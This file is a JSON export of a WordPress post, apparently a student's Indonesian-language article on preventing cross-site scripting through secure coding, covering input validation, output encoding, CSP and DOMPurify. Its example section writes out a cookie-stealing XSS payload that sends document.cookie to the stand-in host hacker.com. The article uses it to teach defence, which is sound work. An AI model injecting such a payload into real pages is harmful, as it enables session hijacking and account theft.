@@ -1,0 +1,313 @@
+{
+  "id": 4073,
+  "title": "Penerapan Secure Coding untuk Mencegah XSS",
+  "slug": "penerapan-secure-coding-untuk-mencegah-xss",
+  "url": "https://buletinsiber.com/penerapan-secure-coding-untuk-mencegah-xss/",
+  "date": "2025-07-09T02:55:25",
+  "date_gmt": "2025-07-09T02:55:25",
+  "modified": "2025-07-09T02:55:25",
+  "modified_gmt": "2025-07-09T02:55:25",
+  "author": {
+    "id": 2,
+    "name": "public enemy"
+  },
+  "categories": [
+    {
+      "id": 6,
+      "name": "Tech"
+    }
+  ],
+  "tags": [
+    333
+  ],
+  "featured_image": "https://buletinsiber.com/wp-content/uploads/2025/07/303.webp",
+  "excerpt": "PendahuluanCross Site Scripting (XSS) adalah salah satu jenis serangan yang paling sering ditemukan dalam aplikasi web. Serangan ini terjadi ketika penyerang menyisipkan skrip berbahaya ke dalam halaman web, lalu dijalankan di browser pengguna. Akibatnya, data pengguna bisa dicuri, akun bisa dibajak, bahkan seluruh sistem bisa terganggu. Untuk mencegah hal ini, web developer perlu memahami pentingnya secure coding. Secure coding adalah praktik menulis kode yang aman sejak awal, bukan menunggu aplikasi jadi baru diperbaiki. Dengan memahami dan menerapkan prinsip secure coding, risiko XSS bisa dikurangi secara signifikan. Artikel ini akan membahas bagaimana secure coding dapat diterapkan untuk mencegah XSS. Pengertian Secure…",
+  "content_html": "<p data-start=\"229\" data-end=\"577\"><strong data-start=\"229\" data-end=\"244\">Pendahuluan</strong><br data-start=\"244\" data-end=\"247\" />Cross Site Scripting (XSS) adalah salah satu jenis serangan yang paling sering ditemukan dalam aplikasi web. Serangan ini terjadi ketika penyerang menyisipkan skrip berbahaya ke dalam halaman web, lalu dijalankan di browser pengguna. Akibatnya, data pengguna bisa dicuri, akun bisa dibajak, bahkan seluruh sistem bisa terganggu.</p>\n<p data-start=\"579\" data-end=\"955\">Untuk mencegah hal ini, web developer perlu memahami pentingnya <em data-start=\"643\" data-end=\"658\">secure coding</em>. Secure coding adalah praktik menulis kode yang aman sejak awal, bukan menunggu aplikasi jadi baru diperbaiki. Dengan memahami dan menerapkan prinsip secure coding, risiko XSS bisa dikurangi secara signifikan. Artikel ini akan membahas bagaimana secure coding dapat diterapkan untuk mencegah XSS.</p>\n<p data-start=\"957\" data-end=\"1333\"><strong data-start=\"957\" data-end=\"985\">Pengertian Secure Coding</strong><br data-start=\"985\" data-end=\"988\" />Secure coding adalah pendekatan dalam menulis kode program yang mempertimbangkan aspek keamanan sejak awal pengembangan. Tujuan utamanya adalah mencegah kerentanan yang bisa dimanfaatkan oleh penyerang. Dalam konteks XSS, secure coding berarti menulis kode yang tidak memberi kesempatan bagi skrip berbahaya untuk dijalankan di browser pengguna.</p>\n<p data-start=\"1335\" data-end=\"1797\"><strong data-start=\"1335\" data-end=\"1362\">Cara Kerja Serangan XSS</strong><br data-start=\"1362\" data-end=\"1365\" />Serangan XSS biasanya memanfaatkan celah di mana input dari pengguna ditampilkan kembali ke halaman web tanpa penyaringan atau pengamanan. Misalnya, jika seseorang menulis komentar seperti <code data-start=\"1554\" data-end=\"1585\">&lt;script&gt;alert('XSS')&lt;/script&gt;</code>, dan komentar itu langsung ditampilkan tanpa diubah, maka skrip tersebut akan dijalankan secara otomatis saat halaman dibuka. Ini bisa dimanfaatkan penyerang untuk mencuri data atau melakukan manipulasi halaman.</p>\n<p data-start=\"1799\" data-end=\"1843\"><strong data-start=\"1799\" data-end=\"1843\">Prinsip Secure Coding untuk Mencegah XSS</strong></p>\n<ol data-start=\"1845\" data-end=\"4253\">\n<li data-start=\"1845\" data-end=\"2234\">\n<p data-start=\"1848\" data-end=\"2234\"><strong data-start=\"1848\" data-end=\"1879\">Validasi dan Sanitasi Input</strong><br data-start=\"1879\" data-end=\"1882\" />Semua input dari pengguna harus diperiksa terlebih dahulu. Jangan pernah percaya pada data yang berasal dari luar. Validasi digunakan untuk memastikan bahwa input sesuai dengan format yang diinginkan, misalnya hanya angka, huruf, atau email. Sanitasi digunakan untuk menghapus karakter berbahaya seperti tag <code data-start=\"2190\" data-end=\"2200\">&lt;script&gt;</code> atau simbol-simbol HTML tertentu.</p>\n</li>\n<li data-start=\"2236\" data-end=\"2543\">\n<p data-start=\"2239\" data-end=\"2543\"><strong data-start=\"2239\" data-end=\"2258\">Encoding Output</strong><br data-start=\"2258\" data-end=\"2261\" />Sebelum data ditampilkan ke halaman web, data tersebut harus diencode. Ini berarti karakter-karakter seperti <code data-start=\"2370\" data-end=\"2373\">&lt;</code>, <code data-start=\"2375\" data-end=\"2378\">&gt;</code>, dan <code data-start=\"2384\" data-end=\"2387\">\"</code> akan diubah ke bentuk yang aman agar tidak dijalankan sebagai skrip. Contohnya, <code data-start=\"2468\" data-end=\"2471\">&lt;</code> akan menjadi <code data-start=\"2485\" data-end=\"2491\">&amp;lt;</code> sehingga tampil sebagai teks biasa, bukan tag HTML.</p>\n</li>\n<li data-start=\"2545\" data-end=\"2836\">\n<p data-start=\"2548\" data-end=\"2836\"><strong data-start=\"2548\" data-end=\"2586\">Menghindari Fungsi yang Tidak Aman</strong><br data-start=\"2586\" data-end=\"2589\" />Fungsi seperti <code data-start=\"2604\" data-end=\"2615\">innerHTML</code>, <code data-start=\"2617\" data-end=\"2635\">document.write()</code>, dan <code data-start=\"2641\" data-end=\"2649\">eval()</code> sebaiknya dihindari, karena bisa menjalankan skrip dari input pengguna. Sebagai gantinya, gunakan <code data-start=\"2748\" data-end=\"2761\">textContent</code>, <code data-start=\"2763\" data-end=\"2774\">innerText</code>, atau metode lain yang menampilkan teks tanpa eksekusi skrip.</p>\n</li>\n<li data-start=\"2838\" data-end=\"3146\">\n<p data-start=\"2841\" data-end=\"3146\"><strong data-start=\"2841\" data-end=\"2888\">Menggunakan Framework dan Library yang Aman</strong><br data-start=\"2888\" data-end=\"2891\" />Banyak framework modern seperti React, Angular, dan Vue sudah memiliki fitur keamanan bawaan yang mencegah XSS. Misalnya, React secara otomatis meng-escape semua output HTML. Namun, fitur ini hanya efektif jika developer tidak menonaktifkan pengamanannya.</p>\n</li>\n<li data-start=\"3148\" data-end=\"3443\">\n<p data-start=\"3151\" data-end=\"3443\"><strong data-start=\"3151\" data-end=\"3195\">Menerapkan Content Security Policy (CSP)</strong><br data-start=\"3195\" data-end=\"3198\" />CSP adalah aturan yang dikirim oleh server ke browser untuk mengatur dari mana skrip boleh dijalankan. Dengan CSP, browser bisa memblokir skrip berbahaya meskipun masuk ke halaman. Ini merupakan lapisan perlindungan tambahan yang sangat efektif.</p>\n</li>\n<li data-start=\"3445\" data-end=\"3683\">\n<p data-start=\"3448\" data-end=\"3683\"><strong data-start=\"3448\" data-end=\"3480\">Menggunakan Library Sanitasi</strong><br data-start=\"3480\" data-end=\"3483\" />Jika aplikasi mengizinkan input HTML dari pengguna, seperti komentar atau artikel, gunakan library seperti DOMPurify untuk membersihkan elemen-elemen berbahaya dari input tersebut sebelum ditampilkan.</p>\n</li>\n<li data-start=\"3685\" data-end=\"4001\">\n<p data-start=\"3688\" data-end=\"4001\"><strong data-start=\"3688\" data-end=\"3746\">Menghindari Menampilkan Pesan Error Mentah ke Pengguna</strong><br data-start=\"3746\" data-end=\"3749\" />Pesan error seperti log sistem, pesan debug, atau traceback tidak boleh ditampilkan langsung ke halaman. Informasi ini bisa dimanfaatkan oleh penyerang. Sebaiknya, tampilkan pesan umum seperti “Terjadi kesalahan” dan simpan detail teknis di server log.</p>\n</li>\n<li data-start=\"4003\" data-end=\"4253\">\n<p data-start=\"4006\" data-end=\"4253\"><strong data-start=\"4006\" data-end=\"4053\">Melakukan Pengujian Keamanan Secara Berkala</strong><br data-start=\"4053\" data-end=\"4056\" />Gunakan alat seperti OWASP ZAP, Burp Suite, atau scanner keamanan untuk mendeteksi potensi XSS. Uji coba ini perlu dilakukan setiap kali ada perubahan dalam sistem atau saat menambahkan fitur baru.</p>\n</li>\n</ol>\n<p data-start=\"4255\" data-end=\"4657\"><strong data-start=\"4255\" data-end=\"4281\">Contoh Kasus Sederhana</strong><br data-start=\"4281\" data-end=\"4284\" />Sebuah situs berita memiliki kolom komentar yang langsung menampilkan isi komentar tanpa penyaringan. Penyerang memasukkan komentar <code data-start=\"4416\" data-end=\"4496\">&lt;script&gt;document.location='http://hacker.com?cookie='+document.cookie&lt;/script&gt;</code>. Setiap pengguna yang membaca komentar ini akan secara otomatis mengirimkan cookie-nya ke penyerang. Ini bisa dicegah jika input disanitasi dan output diencode.</p>\n<p data-start=\"4659\" data-end=\"5184\"><strong data-start=\"4659\" data-end=\"4673\">Kesimpulan</strong><br data-start=\"4673\" data-end=\"4676\" />Serangan XSS dapat menimbulkan kerugian besar, baik bagi pengguna maupun pengelola aplikasi. Namun, dengan menerapkan prinsip secure coding secara konsisten, web developer bisa mencegah celah tersebut sejak awal pengembangan. Validasi input, encoding output, penggunaan library aman, serta pengujian keamanan yang rutin adalah langkah penting untuk menciptakan aplikasi web yang aman. Keamanan bukan hanya tugas tim IT atau keamanan, tapi tanggung jawab setiap developer dalam setiap baris kode yang ditulis.</p>\n<p data-start=\"4659\" data-end=\"5184\">NAMA: AISYA</p>\n<p data-start=\"4659\" data-end=\"5184\">NIM: 23156201029</p>\n<p data-start=\"4659\" data-end=\"5184\">PRODI: SISTEM KOMPUTER</p>\n",
+  "content_text": "Pendahuluan\nCross Site Scripting (XSS) adalah salah satu jenis serangan yang paling sering ditemukan dalam aplikasi web. Serangan ini terjadi ketika penyerang menyisipkan skrip berbahaya ke dalam halaman web, lalu dijalankan di browser pengguna. Akibatnya, data pengguna bisa dicuri, akun bisa dibajak, bahkan seluruh sistem bisa terganggu.\nUntuk mencegah hal ini, web developer perlu memahami pentingnya  secure coding . Secure coding adalah praktik menulis kode yang aman sejak awal, bukan menunggu aplikasi jadi baru diperbaiki. Dengan memahami dan menerapkan prinsip secure coding, risiko XSS bisa dikurangi secara signifikan. Artikel ini akan membahas bagaimana secure coding dapat diterapkan untuk mencegah XSS.\nPengertian Secure Coding\nSecure coding adalah pendekatan dalam menulis kode program yang mempertimbangkan aspek keamanan sejak awal pengembangan. Tujuan utamanya adalah mencegah kerentanan yang bisa dimanfaatkan oleh penyerang. Dalam konteks XSS, secure coding berarti menulis kode yang tidak memberi kesempatan bagi skrip berbahaya untuk dijalankan di browser pengguna.\nCara Kerja Serangan XSS\nSerangan XSS biasanya memanfaatkan celah di mana input dari pengguna ditampilkan kembali ke halaman web tanpa penyaringan atau pengamanan. Misalnya, jika seseorang menulis komentar seperti  <script>alert('XSS')</script> , dan komentar itu langsung ditampilkan tanpa diubah, maka skrip tersebut akan dijalankan secara otomatis saat halaman dibuka. Ini bisa dimanfaatkan penyerang untuk mencuri data atau melakukan manipulasi halaman.\nPrinsip Secure Coding untuk Mencegah XSS\nValidasi dan Sanitasi Input\nSemua input dari pengguna harus diperiksa terlebih dahulu. Jangan pernah percaya pada data yang berasal dari luar. Validasi digunakan untuk memastikan bahwa input sesuai dengan format yang diinginkan, misalnya hanya angka, huruf, atau email. Sanitasi digunakan untuk menghapus karakter berbahaya seperti tag  <script>  atau simbol-simbol HTML tertentu.\nEncoding Output\nSebelum data ditampilkan ke halaman web, data tersebut harus diencode. Ini berarti karakter-karakter seperti  < ,  > , dan  \"  akan diubah ke bentuk yang aman agar tidak dijalankan sebagai skrip. Contohnya,  <  akan menjadi  &lt;  sehingga tampil sebagai teks biasa, bukan tag HTML.\nMenghindari Fungsi yang Tidak Aman\nFungsi seperti  innerHTML ,  document.write() , dan  eval()  sebaiknya dihindari, karena bisa menjalankan skrip dari input pengguna. Sebagai gantinya, gunakan  textContent ,  innerText , atau metode lain yang menampilkan teks tanpa eksekusi skrip.\nMenggunakan Framework dan Library yang Aman\nBanyak framework modern seperti React, Angular, dan Vue sudah memiliki fitur keamanan bawaan yang mencegah XSS. Misalnya, React secara otomatis meng-escape semua output HTML. Namun, fitur ini hanya efektif jika developer tidak menonaktifkan pengamanannya.\nMenerapkan Content Security Policy (CSP)\nCSP adalah aturan yang dikirim oleh server ke browser untuk mengatur dari mana skrip boleh dijalankan. Dengan CSP, browser bisa memblokir skrip berbahaya meskipun masuk ke halaman. Ini merupakan lapisan perlindungan tambahan yang sangat efektif.\nMenggunakan Library Sanitasi\nJika aplikasi mengizinkan input HTML dari pengguna, seperti komentar atau artikel, gunakan library seperti DOMPurify untuk membersihkan elemen-elemen berbahaya dari input tersebut sebelum ditampilkan.\nMenghindari Menampilkan Pesan Error Mentah ke Pengguna\nPesan error seperti log sistem, pesan debug, atau traceback tidak boleh ditampilkan langsung ke halaman. Informasi ini bisa dimanfaatkan oleh penyerang. Sebaiknya, tampilkan pesan umum seperti “Terjadi kesalahan” dan simpan detail teknis di server log.\nMelakukan Pengujian Keamanan Secara Berkala\nGunakan alat seperti OWASP ZAP, Burp Suite, atau scanner keamanan untuk mendeteksi potensi XSS. Uji coba ini perlu dilakukan setiap kali ada perubahan dalam sistem atau saat menambahkan fitur baru.\nContoh Kasus Sederhana\nSebuah situs berita memiliki kolom komentar yang langsung menampilkan isi komentar tanpa penyaringan. Penyerang memasukkan komentar  <script>document.location='http://hacker.com?cookie='+document.cookie</script> . Setiap pengguna yang membaca komentar ini akan secara otomatis mengirimkan cookie-nya ke penyerang. Ini bisa dicegah jika input disanitasi dan output diencode.\nKesimpulan\nSerangan XSS dapat menimbulkan kerugian besar, baik bagi pengguna maupun pengelola aplikasi. Namun, dengan menerapkan prinsip secure coding secara konsisten, web developer bisa mencegah celah tersebut sejak awal pengembangan. Validasi input, encoding output, penggunaan library aman, serta pengujian keamanan yang rutin adalah langkah penting untuk menciptakan aplikasi web yang aman. Keamanan bukan hanya tugas tim IT atau keamanan, tapi tanggung jawab setiap developer dalam setiap baris kode yang ditulis.\nNAMA: AISYA\nNIM: 23156201029\nPRODI: SISTEM KOMPUTER",
+  "raw": {
+    "id": 4073,
+    "date": "2025-07-09T02:55:25",
+    "date_gmt": "2025-07-09T02:55:25",
+    "guid": {
+      "rendered": "https://buletinsiber.com/?p=4073"
+    },
+    "modified": "2025-07-09T02:55:25",
+    "modified_gmt": "2025-07-09T02:55:25",
+    "slug": "penerapan-secure-coding-untuk-mencegah-xss",
+    "status": "publish",
+    "type": "post",
+    "link": "https://buletinsiber.com/penerapan-secure-coding-untuk-mencegah-xss/",
+    "title": {
+      "rendered": "Penerapan Secure Coding untuk Mencegah XSS"
+    },
+    "content": {
+      "rendered": "<p data-start=\"229\" data-end=\"577\"><strong data-start=\"229\" data-end=\"244\">Pendahuluan</strong><br data-start=\"244\" data-end=\"247\" />Cross Site Scripting (XSS) adalah salah satu jenis serangan yang paling sering ditemukan dalam aplikasi web. Serangan ini terjadi ketika penyerang menyisipkan skrip berbahaya ke dalam halaman web, lalu dijalankan di browser pengguna. Akibatnya, data pengguna bisa dicuri, akun bisa dibajak, bahkan seluruh sistem bisa terganggu.</p>\n<p data-start=\"579\" data-end=\"955\">Untuk mencegah hal ini, web developer perlu memahami pentingnya <em data-start=\"643\" data-end=\"658\">secure coding</em>. Secure coding adalah praktik menulis kode yang aman sejak awal, bukan menunggu aplikasi jadi baru diperbaiki. Dengan memahami dan menerapkan prinsip secure coding, risiko XSS bisa dikurangi secara signifikan. Artikel ini akan membahas bagaimana secure coding dapat diterapkan untuk mencegah XSS.</p>\n<p data-start=\"957\" data-end=\"1333\"><strong data-start=\"957\" data-end=\"985\">Pengertian Secure Coding</strong><br data-start=\"985\" data-end=\"988\" />Secure coding adalah pendekatan dalam menulis kode program yang mempertimbangkan aspek keamanan sejak awal pengembangan. Tujuan utamanya adalah mencegah kerentanan yang bisa dimanfaatkan oleh penyerang. Dalam konteks XSS, secure coding berarti menulis kode yang tidak memberi kesempatan bagi skrip berbahaya untuk dijalankan di browser pengguna.</p>\n<p data-start=\"1335\" data-end=\"1797\"><strong data-start=\"1335\" data-end=\"1362\">Cara Kerja Serangan XSS</strong><br data-start=\"1362\" data-end=\"1365\" />Serangan XSS biasanya memanfaatkan celah di mana input dari pengguna ditampilkan kembali ke halaman web tanpa penyaringan atau pengamanan. Misalnya, jika seseorang menulis komentar seperti <code data-start=\"1554\" data-end=\"1585\">&lt;script&gt;alert('XSS')&lt;/script&gt;</code>, dan komentar itu langsung ditampilkan tanpa diubah, maka skrip tersebut akan dijalankan secara otomatis saat halaman dibuka. Ini bisa dimanfaatkan penyerang untuk mencuri data atau melakukan manipulasi halaman.</p>\n<p data-start=\"1799\" data-end=\"1843\"><strong data-start=\"1799\" data-end=\"1843\">Prinsip Secure Coding untuk Mencegah XSS</strong></p>\n<ol data-start=\"1845\" data-end=\"4253\">\n<li data-start=\"1845\" data-end=\"2234\">\n<p data-start=\"1848\" data-end=\"2234\"><strong data-start=\"1848\" data-end=\"1879\">Validasi dan Sanitasi Input</strong><br data-start=\"1879\" data-end=\"1882\" />Semua input dari pengguna harus diperiksa terlebih dahulu. Jangan pernah percaya pada data yang berasal dari luar. Validasi digunakan untuk memastikan bahwa input sesuai dengan format yang diinginkan, misalnya hanya angka, huruf, atau email. Sanitasi digunakan untuk menghapus karakter berbahaya seperti tag <code data-start=\"2190\" data-end=\"2200\">&lt;script&gt;</code> atau simbol-simbol HTML tertentu.</p>\n</li>\n<li data-start=\"2236\" data-end=\"2543\">\n<p data-start=\"2239\" data-end=\"2543\"><strong data-start=\"2239\" data-end=\"2258\">Encoding Output</strong><br data-start=\"2258\" data-end=\"2261\" />Sebelum data ditampilkan ke halaman web, data tersebut harus diencode. Ini berarti karakter-karakter seperti <code data-start=\"2370\" data-end=\"2373\">&lt;</code>, <code data-start=\"2375\" data-end=\"2378\">&gt;</code>, dan <code data-start=\"2384\" data-end=\"2387\">\"</code> akan diubah ke bentuk yang aman agar tidak dijalankan sebagai skrip. Contohnya, <code data-start=\"2468\" data-end=\"2471\">&lt;</code> akan menjadi <code data-start=\"2485\" data-end=\"2491\">&amp;lt;</code> sehingga tampil sebagai teks biasa, bukan tag HTML.</p>\n</li>\n<li data-start=\"2545\" data-end=\"2836\">\n<p data-start=\"2548\" data-end=\"2836\"><strong data-start=\"2548\" data-end=\"2586\">Menghindari Fungsi yang Tidak Aman</strong><br data-start=\"2586\" data-end=\"2589\" />Fungsi seperti <code data-start=\"2604\" data-end=\"2615\">innerHTML</code>, <code data-start=\"2617\" data-end=\"2635\">document.write()</code>, dan <code data-start=\"2641\" data-end=\"2649\">eval()</code> sebaiknya dihindari, karena bisa menjalankan skrip dari input pengguna. Sebagai gantinya, gunakan <code data-start=\"2748\" data-end=\"2761\">textContent</code>, <code data-start=\"2763\" data-end=\"2774\">innerText</code>, atau metode lain yang menampilkan teks tanpa eksekusi skrip.</p>\n</li>\n<li data-start=\"2838\" data-end=\"3146\">\n<p data-start=\"2841\" data-end=\"3146\"><strong data-start=\"2841\" data-end=\"2888\">Menggunakan Framework dan Library yang Aman</strong><br data-start=\"2888\" data-end=\"2891\" />Banyak framework modern seperti React, Angular, dan Vue sudah memiliki fitur keamanan bawaan yang mencegah XSS. Misalnya, React secara otomatis meng-escape semua output HTML. Namun, fitur ini hanya efektif jika developer tidak menonaktifkan pengamanannya.</p>\n</li>\n<li data-start=\"3148\" data-end=\"3443\">\n<p data-start=\"3151\" data-end=\"3443\"><strong data-start=\"3151\" data-end=\"3195\">Menerapkan Content Security Policy (CSP)</strong><br data-start=\"3195\" data-end=\"3198\" />CSP adalah aturan yang dikirim oleh server ke browser untuk mengatur dari mana skrip boleh dijalankan. Dengan CSP, browser bisa memblokir skrip berbahaya meskipun masuk ke halaman. Ini merupakan lapisan perlindungan tambahan yang sangat efektif.</p>\n</li>\n<li data-start=\"3445\" data-end=\"3683\">\n<p data-start=\"3448\" data-end=\"3683\"><strong data-start=\"3448\" data-end=\"3480\">Menggunakan Library Sanitasi</strong><br data-start=\"3480\" data-end=\"3483\" />Jika aplikasi mengizinkan input HTML dari pengguna, seperti komentar atau artikel, gunakan library seperti DOMPurify untuk membersihkan elemen-elemen berbahaya dari input tersebut sebelum ditampilkan.</p>\n</li>\n<li data-start=\"3685\" data-end=\"4001\">\n<p data-start=\"3688\" data-end=\"4001\"><strong data-start=\"3688\" data-end=\"3746\">Menghindari Menampilkan Pesan Error Mentah ke Pengguna</strong><br data-start=\"3746\" data-end=\"3749\" />Pesan error seperti log sistem, pesan debug, atau traceback tidak boleh ditampilkan langsung ke halaman. Informasi ini bisa dimanfaatkan oleh penyerang. Sebaiknya, tampilkan pesan umum seperti “Terjadi kesalahan” dan simpan detail teknis di server log.</p>\n</li>\n<li data-start=\"4003\" data-end=\"4253\">\n<p data-start=\"4006\" data-end=\"4253\"><strong data-start=\"4006\" data-end=\"4053\">Melakukan Pengujian Keamanan Secara Berkala</strong><br data-start=\"4053\" data-end=\"4056\" />Gunakan alat seperti OWASP ZAP, Burp Suite, atau scanner keamanan untuk mendeteksi potensi XSS. Uji coba ini perlu dilakukan setiap kali ada perubahan dalam sistem atau saat menambahkan fitur baru.</p>\n</li>\n</ol>\n<p data-start=\"4255\" data-end=\"4657\"><strong data-start=\"4255\" data-end=\"4281\">Contoh Kasus Sederhana</strong><br data-start=\"4281\" data-end=\"4284\" />Sebuah situs berita memiliki kolom komentar yang langsung menampilkan isi komentar tanpa penyaringan. Penyerang memasukkan komentar <code data-start=\"4416\" data-end=\"4496\">&lt;script&gt;document.location='http://hacker.com?cookie='+document.cookie&lt;/script&gt;</code>. Setiap pengguna yang membaca komentar ini akan secara otomatis mengirimkan cookie-nya ke penyerang. Ini bisa dicegah jika input disanitasi dan output diencode.</p>\n<p data-start=\"4659\" data-end=\"5184\"><strong data-start=\"4659\" data-end=\"4673\">Kesimpulan</strong><br data-start=\"4673\" data-end=\"4676\" />Serangan XSS dapat menimbulkan kerugian besar, baik bagi pengguna maupun pengelola aplikasi. Namun, dengan menerapkan prinsip secure coding secara konsisten, web developer bisa mencegah celah tersebut sejak awal pengembangan. Validasi input, encoding output, penggunaan library aman, serta pengujian keamanan yang rutin adalah langkah penting untuk menciptakan aplikasi web yang aman. Keamanan bukan hanya tugas tim IT atau keamanan, tapi tanggung jawab setiap developer dalam setiap baris kode yang ditulis.</p>\n<p data-start=\"4659\" data-end=\"5184\">NAMA: AISYA</p>\n<p data-start=\"4659\" data-end=\"5184\">NIM: 23156201029</p>\n<p data-start=\"4659\" data-end=\"5184\">PRODI: SISTEM KOMPUTER</p>\n",
+      "protected": false
+    },
+    "excerpt": {
+      "rendered": "<p>PendahuluanCross Site Scripting (XSS) adalah salah satu jenis serangan yang paling sering ditemukan dalam aplikasi web. Serangan ini terjadi ketika penyerang menyisipkan skrip berbahaya ke dalam halaman web, lalu dijalankan di browser pengguna. Akibatnya, data pengguna bisa dicuri, akun bisa dibajak, bahkan seluruh sistem bisa terganggu. Untuk mencegah hal ini, web developer perlu memahami pentingnya secure coding. Secure coding adalah praktik menulis kode yang aman sejak awal, bukan menunggu aplikasi jadi baru diperbaiki. Dengan memahami dan menerapkan prinsip secure coding, risiko XSS bisa dikurangi secara signifikan. Artikel ini akan membahas bagaimana secure coding dapat diterapkan untuk mencegah XSS. Pengertian Secure&#8230;</p>\n",
+      "protected": false
+    },
+    "author": 2,
+    "featured_media": 4074,
+    "comment_status": "open",
+    "ping_status": "open",
+    "sticky": false,
+    "template": "",
+    "format": "standard",
+    "meta": {
+      "_acf_changed": false,
+      "_yoast_wpseo_focuskw": "",
+      "_yoast_wpseo_title": "",
+      "_yoast_wpseo_metadesc": "",
+      "footnotes": "",
+      "rank_math_title": "",
+      "rank_math_description": "",
+      "rank_math_focus_keyword": "",
+      "_aioseop_title": "",
+      "_aioseop_description": "",
+      "jetpack_publicize_message": "",
+      "jetpack_publicize_feature_enabled": true,
+      "jetpack_social_post_already_shared": false,
+      "jetpack_social_options": {
+        "image_generator_settings": {
+          "template": "highway",
+          "default_image_id": 0,
+          "font": "",
+          "enabled": false
+        },
+        "version": 2
+      }
+    },
+    "categories": [
+      6
+    ],
+    "tags": [
+      333
+    ],
+    "class_list": [
+      "post-4073",
+      "post",
+      "type-post",
+      "status-publish",
+      "format-standard",
+      "has-post-thumbnail",
+      "hentry",
+      "category-tech",
+      "tag-artikel"
+    ],
+    "acf": [],
+    "yoast_head": "<!-- This site is optimized with the Yoast SEO plugin v24.0 - https://yoast.com/wordpress/plugins/seo/ -->\n<title>Penerapan Secure Coding untuk Mencegah XSS - buletinsiber.com</title>\n<meta name=\"robots\" content=\"index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1\" />\n<link rel=\"canonical\" href=\"https://buletinsiber.com/penerapan-secure-coding-untuk-mencegah-xss/\" />\n<meta property=\"og:locale\" content=\"en_US\" />\n<meta property=\"og:type\" content=\"article\" />\n<meta property=\"og:title\" content=\"Penerapan Secure Coding untuk Mencegah XSS - buletinsiber.com\" />\n<meta property=\"og:description\" content=\"PendahuluanCross Site Scripting (XSS) adalah salah satu jenis serangan yang paling sering ditemukan dalam aplikasi web. Serangan ini terjadi ketika penyerang menyisipkan skrip berbahaya ke dalam halaman web, lalu dijalankan di browser pengguna. Akibatnya, data pengguna bisa dicuri, akun bisa dibajak, bahkan seluruh sistem bisa terganggu. Untuk mencegah hal ini, web developer perlu memahami pentingnya secure coding. Secure coding adalah praktik menulis kode yang aman sejak awal, bukan menunggu aplikasi jadi baru diperbaiki. Dengan memahami dan menerapkan prinsip secure coding, risiko XSS bisa dikurangi secara signifikan. Artikel ini akan membahas bagaimana secure coding dapat diterapkan untuk mencegah XSS. Pengertian Secure...\" />\n<meta property=\"og:url\" content=\"https://buletinsiber.com/penerapan-secure-coding-untuk-mencegah-xss/\" />\n<meta property=\"og:site_name\" content=\"buletinsiber.com\" />\n<meta property=\"article:publisher\" content=\"https://www.facebook.com/publiksultra/\" />\n<meta property=\"article:published_time\" content=\"2025-07-09T02:55:25+00:00\" />\n<meta property=\"og:image\" content=\"https://buletinsiber.com/wp-content/uploads/2025/07/303.webp\" />\n\t<meta property=\"og:image:width\" content=\"1200\" />\n\t<meta property=\"og:image:height\" content=\"725\" />\n\t<meta property=\"og:image:type\" content=\"image/webp\" />\n<meta name=\"author\" content=\"public enemy\" />\n<meta name=\"twitter:card\" content=\"summary_large_image\" />\n<meta name=\"twitter:label1\" content=\"Written by\" />\n\t<meta name=\"twitter:data1\" content=\"public enemy\" />\n\t<meta name=\"twitter:label2\" content=\"Est. reading time\" />\n\t<meta name=\"twitter:data2\" content=\"3 minutes\" />\n<script type=\"application/ld+json\" class=\"yoast-schema-graph\">{\"@context\":\"https://schema.org\",\"@graph\":[{\"@type\":\"WebPage\",\"@id\":\"https://buletinsiber.com/penerapan-secure-coding-untuk-mencegah-xss/\",\"url\":\"https://buletinsiber.com/penerapan-secure-coding-untuk-mencegah-xss/\",\"name\":\"Penerapan Secure Coding untuk Mencegah XSS - buletinsiber.com\",\"isPartOf\":{\"@id\":\"https://buletinsiber.com/#website\"},\"primaryImageOfPage\":{\"@id\":\"https://buletinsiber.com/penerapan-secure-coding-untuk-mencegah-xss/#primaryimage\"},\"image\":{\"@id\":\"https://buletinsiber.com/penerapan-secure-coding-untuk-mencegah-xss/#primaryimage\"},\"thumbnailUrl\":\"https://buletinsiber.com/wp-content/uploads/2025/07/303.webp\",\"datePublished\":\"2025-07-09T02:55:25+00:00\",\"dateModified\":\"2025-07-09T02:55:25+00:00\",\"author\":{\"@id\":\"https://buletinsiber.com/#/schema/person/f5a8529dcfc055c262c6563c6522fb91\"},\"breadcrumb\":{\"@id\":\"https://buletinsiber.com/penerapan-secure-coding-untuk-mencegah-xss/#breadcrumb\"},\"inLanguage\":\"en-US\",\"potentialAction\":[{\"@type\":\"ReadAction\",\"target\":[\"https://buletinsiber.com/penerapan-secure-coding-untuk-mencegah-xss/\"]}]},{\"@type\":\"ImageObject\",\"inLanguage\":\"en-US\",\"@id\":\"https://buletinsiber.com/penerapan-secure-coding-untuk-mencegah-xss/#primaryimage\",\"url\":\"https://buletinsiber.com/wp-content/uploads/2025/07/303.webp\",\"contentUrl\":\"https://buletinsiber.com/wp-content/uploads/2025/07/303.webp\",\"width\":1200,\"height\":725},{\"@type\":\"BreadcrumbList\",\"@id\":\"https://buletinsiber.com/penerapan-secure-coding-untuk-mencegah-xss/#breadcrumb\",\"itemListElement\":[{\"@type\":\"ListItem\",\"position\":1,\"name\":\"Home\",\"item\":\"https://buletinsiber.com/\"},{\"@type\":\"ListItem\",\"position\":2,\"name\":\"Penerapan Secure Coding untuk Mencegah XSS\"}]},{\"@type\":\"WebSite\",\"@id\":\"https://buletinsiber.com/#website\",\"url\":\"https://buletinsiber.com/\",\"name\":\"buletinsiber.com\",\"description\":\"sumber berita terupdate seputar keamanan siber dan teknologi terkini\",\"alternateName\":\"buletin siber\",\"potentialAction\":[{\"@type\":\"SearchAction\",\"target\":{\"@type\":\"EntryPoint\",\"urlTemplate\":\"https://buletinsiber.com/?s={search_term_string}\"},\"query-input\":{\"@type\":\"PropertyValueSpecification\",\"valueRequired\":true,\"valueName\":\"search_term_string\"}}],\"inLanguage\":\"en-US\"},{\"@type\":\"Person\",\"@id\":\"https://buletinsiber.com/#/schema/person/f5a8529dcfc055c262c6563c6522fb91\",\"name\":\"public enemy\",\"image\":{\"@type\":\"ImageObject\",\"inLanguage\":\"en-US\",\"@id\":\"https://buletinsiber.com/#/schema/person/image/\",\"url\":\"https://secure.gravatar.com/avatar/af7771d86188d142ee0d8c9c8feb4fdb5d463ff8959448100bf47ad25c3052c8?s=96&d=mm&r=g\",\"contentUrl\":\"https://secure.gravatar.com/avatar/af7771d86188d142ee0d8c9c8feb4fdb5d463ff8959448100bf47ad25c3052c8?s=96&d=mm&r=g\",\"caption\":\"public 